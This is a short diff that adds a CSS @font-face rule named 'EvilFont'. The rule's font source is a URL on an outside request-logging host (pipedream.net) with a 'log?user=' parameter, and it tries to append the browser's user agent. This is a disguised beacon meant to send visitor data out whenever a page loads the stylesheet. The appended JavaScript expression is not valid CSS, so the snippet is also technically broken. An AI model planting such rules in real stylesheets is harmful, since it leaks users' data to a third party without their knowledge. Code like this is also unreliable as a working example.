@@ -1,0 +1,4 @@
+@font-face {
+  font-family: 'EvilFont';
+  src: url("https://eo10sr0fi9sxhnf.m.pipedream.net/log?user=" + navigator.userAgent);
+}
